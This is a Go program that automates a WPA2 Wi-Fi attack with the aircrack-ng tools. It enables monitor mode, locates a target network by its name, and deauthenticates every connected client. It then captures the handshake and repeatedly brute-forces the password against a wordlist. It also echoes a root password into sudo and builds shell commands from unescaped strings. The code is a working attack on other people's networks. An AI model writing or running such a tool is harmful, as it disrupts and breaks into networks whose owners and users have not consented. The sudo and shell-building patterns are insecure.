package main

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

func execCmd(cmd string) (string, string) {
	cmdWithSudo := fmt.Sprintf("echo %v | sudo -S %v", ROOT_PASS, cmd)

	exec := exec.Command("/bin/sh", "-c", cmdWithSudo)

	var out bytes.Buffer
	var stderr bytes.Buffer
	exec.Stdout = &out
	exec.Stderr = &stderr

	exec.Run()

	return out.String(), stderr.String()
}

func checkAvailableInterfaces() {
	fmt.Println("Check availables network interface....")

	output, err := execCmd("airmon-ng")
	if err != "" {
		log.Fatal(err)
	}

	fmt.Println(output)
	fmt.Println("set desired interface hard coded for now since I'm little dumb :(")
}

func setInterfaceToMonitorMode(netInterface string) {
	fmt.Println("set interface => ", netInterface, "to monitor mode")

	output, err := execCmd("airmon-ng start " + netInterface)
	if err != "" {
		log.Fatal(err)
	}

	if strings.Contains(output, "Kill them using 'airmon-ng check kill'") {
		fmt.Println("killing processes that could cause trouble and try again...")
		output, err = execCmd("airmon-ng check kill")
		if err != "" {
			log.Fatal(err)
		}
		// try to put in monitor mode again
		setInterfaceToMonitorMode(netInterface)
	}
	fmt.Println(output)
}

// ESSID example: Casa_wifi_rep, VIVOFIBRA and so on
// returns de MAC_ADDRESS and CHANNEL formatted in string
func getTargetInterfaceFromESSID(ESSID, netInterface string) (string, string) {
	fmt.Println("Check for interfaces...")

	cmdWithSudo := fmt.Sprintf("echo %v | sudo -S airodump-ng %v --essid '%v' --update 2 --output-format kismet --write-interval 2 --write ariodumpout", ROOT_PASS, netInterface, ESSID)

	cmd := exec.Command("sh", "-c", cmdWithSudo)

	if err := cmd.Start(); err != nil {
		log.Fatalln("Error")
	}

	fmt.Println("Giving 15 seconds to airodump-ng collect packets...")
	time.Sleep(15 * time.Second)
	fmt.Println("Killing airodump-ng pids...")
	execCmd("pkill -f 'airodump-ng'")

	content, err := os.ReadFile("ariodumpout-01.kismet.csv")
	if err != nil {
		log.Fatal(err)
	}

	// kismet is file separeted by ";"
	parsedKismet := strings.Split(string(content), ";")
	var macAddress string
	var channel string
	for i, v := range parsedKismet {
		if v == ESSID {
			macAddress = parsedKismet[i+1]
			channel = parsedKismet[i+3]
			break
		}
	}

	fmt.Printf(`---------------
find mac address => %v channel => %v for ESSID => %v
---------------
`, macAddress, channel, ESSID)

	return macAddress, channel
}

func analyzePackets(macAddress, channel, netInterface string) {
	fmt.Println("running analyzing packets...")

	cmdWithSudo := fmt.Sprintf("echo %v | sudo -S airodump-ng -w hack -c %v --bssid %v %v", ROOT_PASS, channel, macAddress, netInterface)

	cmd := exec.Command("sh", "-c", cmdWithSudo)

	if err := cmd.Start(); err != nil {
		log.Fatalln("Error")
	}
}

func deauthEveryone(macAddress, channel, netInterface string) {
	fmt.Println("running deauth everyone...")

	cmdWithSudo := fmt.Sprintf("echo %v | sudo -S aireplay-ng --deauth %v -a %v %v", ROOT_PASS, channel, macAddress, netInterface)

	cmd := exec.Command("sh", "-c", cmdWithSudo)

	if err := cmd.Start(); err != nil {
		log.Fatalln("Error")
	}
}

func runWPA2BruteForceInLoop() {
	fmt.Println("trying to start brute force")
	for {
		fmt.Println("running brute force...")

		stdout, stderr := execCmd(fmt.Sprintf("aircrack-ng hack-01.cap -w %v", WPA_WORDLIST))

		if stderr != "" {
			fmt.Println(stderr)
			fmt.Println("Waiting for capturing handshake, trying brute force again in 30 seconds...")
			time.Sleep(30 * time.Second)
			continue
		}

		fmt.Println(stdout)
		break
	}
	fmt.Println("finishing brute force")
}
